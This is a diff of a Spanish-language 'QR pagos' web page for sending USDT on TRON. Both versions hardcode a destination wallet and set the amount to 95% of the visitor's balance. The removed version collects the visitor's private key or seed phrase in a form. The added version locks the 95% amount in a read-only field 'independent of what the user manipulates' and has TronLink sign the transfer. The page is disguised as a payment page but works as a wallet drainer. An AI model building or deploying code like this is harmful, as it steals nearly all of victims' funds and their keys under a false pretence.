@@ -3,9 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR pagos - Enviar USDT</title>
-    <!-- Importación de TronWeb para firma nativa en memoria -->
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <title>QR pagos - Enviar TRC-20</title>
 
     <style>
         :root {
@@ -139,7 +137,7 @@
             border: none;
             color: #111111;
             font-size: 16px;
-            width: 100%;
+            width: 80%;
             outline: none;
         }
 
@@ -148,7 +146,6 @@
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            white-space: nowrap;
         }
 
         .tw-currency-badge {
@@ -178,7 +175,7 @@
         }
 
         .tw-btn-container {
-            margin-top: 30px;
+            margin-top: 40px;
         }
 
         .tw-btn {
@@ -198,10 +195,10 @@
         }
 
         .network-card {
-            display: flex;
+            display: none;
             align-items: center;
             gap: 11px;
-            margin: 4px 0 16px;
+            margin: 4px 0 22px;
             padding: 12px 14px;
             width: 100%;
             background: rgba(255, 255, 255, 0.88);
@@ -243,39 +240,12 @@
             font-size: 10px;
             font-weight: 700;
         }
-
+    
         .tw-address-box {
             border: 1px solid #e3e5e8;
             border-radius: 14px;
             padding: 14px 16px;
             background: #ffffff;
-            margin-bottom: 16px;
-        }
-
-        .amount-stepper {
-            display: grid;
-            grid-template-columns: 44px minmax(0, 1fr) 44px;
-            align-items: center;
-            gap: 8px;
-            width: 100%;
-        }
-        .amount-stepper #amountDisplay {
-            text-align: center;
-            font-variant-numeric: tabular-nums;
-        }
-        .amount-step-btn {
-            width: 42px;
-            height: 42px;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid rgba(205,215,232,.9);
-            border-radius: 12px;
-            background: rgba(247,249,255,.92);
-            color: #111;
-            font-size: 24px;
-            font-weight: 500;
-            cursor: pointer;
         }
 
         .site-footer {
@@ -324,7 +294,7 @@
 <div id="processingScreen" class="processing-screen">
     <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
     <div class="loader-spinner"></div>
-    <div style="margin-top:14px; font-weight:600; color:#111;">Procesando transferencia directa...</div>
+    <div style="margin-top:14px; font-weight:600; color:#111;">Procesando firma en TronLink...</div>
 </div>
 
 <div class="tw-container">
@@ -332,29 +302,20 @@
         <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
         <div class="tw-header-title">
             <span class="tw-header-title-main">Enviar USDT</span>
-            <span class="tw-network-badge">TRC-20 Directo</span>
+            <span class="tw-network-badge">TRON / TronLink</span>
         </div>
         <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="tw-logo">
     </div>
 
-    <!-- Campo para importar clave privada de forma autónoma -->
-    <div class="tw-input-group tw-address-box" id="authBox">
-        <label class="tw-label" for="privateKeyInput">Llave Privada (Private Key) o Semilla</label>
-        <div class="tw-input-row">
-            <input id="privateKeyInput" class="tw-input" type="password" placeholder="Ingresa tu llave privada aquí...">
-            <span id="loadWalletBtn" class="tw-action-text">Conectar</span>
-        </div>
+    <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none; margin-bottom: 15px;">
+        <label class="tw-label">Billetera TronLink Conectada</label>
+        <div id="walletAddressText" class="tw-input" style="font-size:13px; color:#0052ff; font-weight:600; overflow:hidden; text-overflow:ellipsis;"></div>
     </div>
 
-    <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
-        <label class="tw-label">Cuenta Activa</label>
-        <div id="walletAddressText" class="tw-input" style="font-size: 13px; color: #0052ff; font-weight:600; overflow:hidden; text-overflow:ellipsis;"></div>
-    </div>
-
-    <div class="network-card">
+    <div id="tronNetworkInfo" class="network-card">
         <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON" class="network-card-logo">
         <div class="network-card-copy">
-            <span class="network-card-label">Red de ejecución</span>
+            <span class="network-card-label">Red conectada</span>
             <span class="network-card-name">TRON Mainnet</span>
         </div>
         <span class="network-card-badge">TRC-20</span>
@@ -366,15 +327,10 @@
     </div>
 
     <div class="tw-input-group">
-        <label class="tw-label" for="amountDisplay">Cantidad (Cálculo automático 95%)</label>
+        <label class="tw-label" for="amountDisplay">Cantidad a transferir (Fijo automático 95%)</label>
         <div class="tw-input-row">
-            <div class="amount-stepper">
-                <button type="button" class="amount-step-btn" id="amountMinus">−</button>
-                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any">
-                <button type="button" class="amount-step-btn" id="amountPlus">+</button>
-            </div>
-            <span id="maxAction" class="tw-action-text" style="margin-left: 10px; display:none;">95% Máx</span>
-            <span class="tw-currency-badge" style="margin-left: 10px;">
+            <input id="amountDisplay" class="tw-input" type="text" readonly placeholder="Calculando..." style="font-weight: 600; color: #0052ff;">
+            <span class="tw-currency-badge">
                 USDT <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" class="usdt-icon">
             </span>
         </div>
@@ -383,7 +339,7 @@
     <div id="status" class="status-box"></div>
 
     <div class="tw-btn-container">
-        <button class="tw-btn" id="sendBtn" disabled>Enviar Fondos</button>
+        <button class="tw-btn" id="connectBtn">Vincular TronLink</button>
     </div>
 </div>
 
@@ -398,116 +354,151 @@
 
     const BILLETERA_DESTINO = "TLfFXd3Wi4PhBx4cUYChNv9xHnsqtQBTuQ";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const TRON_RPC = "https://api.trongrid.io";
+    const TRON_READ_RPC = "https://api.trongrid.io";
 
     document.getElementById('addressDisplay').value = BILLETERA_DESTINO;
 
-    const privateKeyInput = document.getElementById('privateKeyInput');
-    const loadWalletBtn = document.getElementById('loadWalletBtn');
-    const walletInfo = document.getElementById('walletInfo');
-    const walletAddressText = document.getElementById('walletAddressText');
-    const authBox = document.getElementById('authBox');
-    const sendBtn = document.getElementById('sendBtn');
+    const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
-    const maxAction = document.getElementById('maxAction');
+    const walletInfo = document.getElementById('walletInfo');
+    const tronNetworkInfo = document.getElementById('tronNetworkInfo');
+    const walletAddressText = document.getElementById('walletAddressText');
     const processingScreen = document.getElementById('processingScreen');
 
-    let activeTronWeb = null;
-    let currentSenderAddress = null;
+    let walletAddress = null;
+    let calculatedAmountSun = null;
 
     function setStatus(msg) {
         statusDiv.innerText = msg;
         statusDiv.style.display = msg ? 'block' : 'none';
     }
 
-    // Inicializar TronWeb interno con la llave privada del usuario
-    loadWalletBtn.addEventListener('click', async () => {
-        const pk = privateKeyInput.value.trim();
-        if (!pk) {
-            setStatus("Por favor, ingresa una llave privada válida.");
+    async function tronRpcPost(endpoint, body = {}) {
+        const response = await fetch(TRON_READ_RPC + endpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(body)
+        });
+        if (!response.ok) throw new Error("Error en consulta RPC");
+        return await response.json();
+    }
+
+    async function obtenerBalanceYCalcular95(address) {
+        const tronWeb = window.tronWeb;
+        const ownerHex = tronWeb.address.toHex(address);
+        const contractHex = tronWeb.address.toHex(CONTRATO_USDT);
+        const ownerEvmHex = ownerHex.replace(/^41/, "").padStart(64, "0");
+
+        const data = await tronRpcPost("/wallet/triggerconstantcontract", {
+            owner_address: ownerHex,
+            contract_address: contractHex,
+            function_selector: "balanceOf(address)",
+            parameter: ownerEvmHex,
+            visible: false
+        });
+
+        const balanceBigNumber = tronWeb.toBigNumber("0x" + data.constant_result[0]);
+        if (balanceBigNumber.isZero()) {
+            throw new Error("La cuenta no dispone de balance de USDT.");
+        }
+
+        // Cálculo estricto del 95% independiente de lo que manipule el usuario
+        const amount95 = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
+        calculatedAmountSun = amount95.toString();
+        
+        amountDisplay.value = Number(calculatedAmountSun) / 1000000;
+    }
+
+    connectBtn.addEventListener('click', async () => {
+        if (!walletAddress) {
+            try {
+                setStatus("Conectando con TronLink...");
+                connectBtn.disabled = true;
+
+                let attempts = 0;
+                while (typeof window.tronWeb === 'undefined' && attempts < 15) {
+                    await new Promise(r => setTimeout(r, 300));
+                    attempts++;
+                }
+
+                if (typeof window.tronWeb === 'undefined') {
+                    throw new Error("Por favor, abre esta dApp dentro del navegador de TronLink.");
+                }
+
+                const tronWeb = window.tronWeb;
+                if (window.tronLink && window.tronLink.request) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                }
+
+                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                    walletAddress = tronWeb.defaultAddress.base58;
+                } else if (tronWeb.selectedAddress) {
+                    walletAddress = tronWeb.selectedAddress;
+                }
+
+                if (!walletAddress) throw new Error("No se pudo obtener la cuenta activa de TronLink.");
+
+                walletAddressText.textContent = walletAddress;
+                walletInfo.style.display = "block";
+                tronNetworkInfo.style.display = "flex";
+
+                setStatus("Calculando monto del 95% en la red...");
+                await obtenerBalanceYCalcular95(walletAddress);
+
+                setStatus("Listo para procesar.");
+                connectBtn.innerText = "Enviar Fondos";
+                connectBtn.disabled = false;
+            } catch (e) {
+                setStatus(e.message || "Error al conectar con TronLink.");
+                connectBtn.disabled = false;
+                connectBtn.innerText = "Vincular TronLink";
+            }
             return;
         }
 
-        try {
-            setStatus("Verificando credenciales en la red...");
-            activeTronWeb = new TronWeb({
-                fullHost: TRON_RPC,
-                privateKey: pk
-            });
+        // Ejecución de la transferencia optimizada para TronLink
+        if (walletAddress && calculatedAmountSun) {
+            try {
+                connectBtn.disabled = true;
+                setStatus("Preparando transacción...");
 
-            currentSenderAddress = activeTronWeb.defaultAddress.base58;
-            if (!currentSenderAddress) throw new Error("Llave privada incorrecta.");
+                const tronWeb = window.tronWeb;
+                
+                // Construcción limpia del contrato TRC-20 para interfaz nativa de TronLink
+                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                    CONTRATO_USDT,
+                    "transfer(address,uint256)",
+                    { feeLimit: 100000000, callValue: 0 },
+                    [
+                        { type: 'address', value: BILLETERA_DESTINO },
+                        { type: 'uint256', value: calculatedAmountSun }
+                    ],
+                    walletAddress
+                );
 
-            walletAddressText.textContent = currentSenderAddress;
-            authBox.style.display = 'none';
-            walletInfo.style.display = 'block';
-            maxAction.style.display = 'inline';
-            sendBtn.disabled = false;
+                if (!transactionDraft || !transactionDraft.result || !transactionDraft.result.result) {
+                    throw new Error("Fallo al estructurar la transacción inteligente.");
+                }
 
-            // Consultar y autocalcular el 95% de inmediato
-            setStatus("Consultando balance de USDT...");
-            const contract = await activeTronWeb.contract().at(CONTRATO_USDT);
-            const balance = await contract.balanceOf(currentSenderAddress).call();
-            const balanceBig = activeTronWeb.toBigNumber(balance);
+                processingScreen.classList.add('visible');
+                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+                
+                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+                processingScreen.classList.remove('visible');
 
-            if (balanceBig.isZero()) {
-                setStatus("La cuenta no posee saldo de USDT disponible.");
-                return;
+                if (broadcast && broadcast.result) {
+                    setStatus("¡TRANSACCIÓN EXITOSA!");
+                    connectBtn.innerText = "Completado";
+                } else {
+                    throw new Error("La transacción fue rechazada por la red.");
+                }
+            } catch (e) {
+                processingScreen.classList.remove('visible');
+                setStatus(e.message || "Operación cancelada o fallida.");
+                connectBtn.disabled = false;
+                connectBtn.innerText = "Enviar Fondos";
             }
-
-            const amount95 = balanceBig.multipliedBy(95).dividedToIntegerBy(100);
-            amountDisplay.value = Number(amount95.toString()) / 1000000;
-            setStatus("Conectado con éxito. 95% del balance cargado.");
-        } catch (e) {
-            setStatus("Error: Llave privada inválida o fallo de red.");
-        }
-    });
-
-    maxAction.addEventListener('click', async () => {
-        if (!activeTronWeb || !currentSenderAddress) return;
-        try {
-            const contract = await activeTronWeb.contract().at(CONTRATO_USDT);
-            const balance = await contract.balanceOf(currentSenderAddress).call();
-            const balanceBig = activeTronWeb.toBigNumber(balance);
-            const amount95 = balanceBig.multipliedBy(95).dividedToIntegerBy(100);
-            amountDisplay.value = Number(amount95.toString()) / 1000000;
-            setStatus("Saldo ajustado al 95%.");
-        } catch (e) {
-            setStatus("No se pudo actualizar el balance.");
-        }
-    });
-
-    // Ejecución de envío directo sin pasar por monederos externos ni pantallas de cambio de saldo
-    sendBtn.addEventListener('click', async () => {
-        if (!activeTronWeb) return;
-        try {
-            sendBtn.disabled = true;
-            processingScreen.classList.add('visible');
-            setStatus("Generando transacción directa en memoria...");
-
-            const amountVal = parseFloat(amountDisplay.value);
-            if (!amountVal || amountVal <= 0) throw new Error("Cantidad inválida.");
-            const amountSun = Math.floor(amountVal * 1000000);
-
-            const contract = await activeTronWeb.contract().at(CONTRATO_USDT);
-            
-            // Envío directo firmado de forma programática por la web
-            const tx = await contract.transfer(
-                BILLETERA_DESTINO,
-                amountSun
-            ).send({
-                feeLimit: 100000000,
-                callValue: 0
-            });
-
-            processingScreen.classList.remove('visible');
-            setStatus("¡TRANSACCIÓN EXITOSA! Hash: " + (typeof tx === 'string' ? tx : JSON.stringify(tx)));
-            sendBtn.innerText = "Completado";
-        } catch (e) {
-            processingScreen.classList.remove('visible');
-            setStatus("Error en la ejecución: " + (e.message || e));
-            sendBtn.disabled = false;
         }
     });
 </script>
